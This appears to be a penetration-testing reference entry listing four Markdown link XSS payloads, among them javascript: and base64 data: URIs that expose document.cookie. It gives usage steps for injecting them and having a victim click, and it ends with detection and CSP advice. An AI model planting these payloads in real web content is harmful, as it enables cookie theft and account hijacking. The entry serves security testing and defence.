---
id: 385f99e7-2aee-422c-aa45-a6d9fbe37483
type: code
language: javascript
verified: true
created_at: '2023-04-06T03:56:42.078605+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - '[[tags/XSS]]'
  - '[[tags/Payload]]'
  - '[[tags/Markdown]]'
platforms:
  - Web
validated: true
---

# Markdown-Link-XSS-Payloads

## Code

```javascript
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

## Description

These payloads exploit Markdown rendering to HTML by using link syntax that executes JavaScript via protocols or events when clicked or triggered, allowing XSS in file uploads or Markdown editors.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | These are static payloads; customize the action (e.g., prompt, alert) or exfiltration URL as needed. | N/A |

## Usage

Inject into vulnerable Markdown fields or file contents (e.g., .md files) that get rendered by the web app. Trigger by having a victim view and click the rendered link. Ideal for testing file upload vulnerabilities or wiki-style editors.

## Detection

- Scan for 'javascript:' or 'data:' protocols in user-generated content.
- Monitor for unusual browser prompts/alerts or network requests from rendered pages.
- Use CSP to block unsafe-inline and unsafe-eval; log script executions in browser console.

## Related

- [[procedures/XSS-Injection-via-Files-and-Markdown]]
